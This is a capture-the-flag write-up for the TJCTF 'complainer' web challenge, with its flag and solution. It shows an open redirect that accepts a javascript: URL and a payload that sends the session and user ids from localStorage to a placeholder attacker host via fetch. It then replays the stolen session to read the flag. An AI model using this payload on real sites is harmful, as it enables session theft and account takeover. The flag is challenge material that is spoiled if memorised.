# complainer

## Flag

tjctf{grrrrrrrrr_315b9c0f}

## Solution

On this web application the user can create posts called "complaints" containing some text which can be accessed on URL with the format `https://complainer.tjc.tf/post/POST_ID`.

In `server/public/login.js` we can see that while logging in the script fetches a session id and a user id.
Then, it stores them into the local storage of the browser:

```JavaScript
        localStorage.setItem('sessionId', res.sessionId);
        localStorage.setItem('userId', res.userId);
```

There is an open redirect vulnerability in the file `server/public/login.js`:

```JavaScript
function redirect() {
    if ('sessionId' in localStorage && 'userId' in localStorage)
        window.location = new URLSearchParams(window.location.search).get('next') ?? '/';
}
```

The challenge has an admin bot to which we can submit an URL starting with `https://complainer.tjc.tf`. The admin bot then creates an new account and stores the flag in a "complaint".
We create the payload `javascript:fetch('ATTACKER_URL?'+btoa(localStorage.getItem('userId')+' '+localStorage.getItem('sessionId')))` and then submit
the URL `https://complainer.tjc.tf/login?next=javascript%3Afetch('ATTACKER_URL%3F'%2Bbtoa(localStorage.getItem('userId')%2B'%20'%2BlocalStorage.getItem('sessionId')))` to the admin bot for getting the value of "userId" and "sessionId" in the
local storage of the browser. Then, we can see an HTTP request containing `NGI1Mzc2OTAtNzhmYy00MGM0LWIwM2UtOTNhYzk0NzM3MDk1IGFiMDA0NWQyLWU1MjQtNDU2ZS05MDg4LWRiMGQ5OGQwOTdlYw==` in the query parameters in the HTTP server logs.
We decode that base64 encoded string and get the value of "userId" and "sessionId".

Then, we set the values of "userId" and "sessionId" in the local storage of a local browser by using the developer tools to the values we obtained from the HTTP server logs.

We navigate to `https://complainer.tjc.tf/profile`, we can see that the browser makes a request to the `https://complainer.tjc.tf/api/profile` endpoint and the server responds with following JSON content which contains the flag.

```JSON
{"user":{"username":"a0f387bbe3b796002e7d4a01d5ea42b0","userId":"4b537690-78fc-40c4-b03e-93ac94737095","posts":[{"id":"1af1f8f1-05f4-448e-b5f6-e010b742ecb4","userId":"4b537690-78fc-40c4-b03e-93ac94737095","body":"tjctf{grrrrrrrrr_315b9c0f}"}]},"ok":true}
```
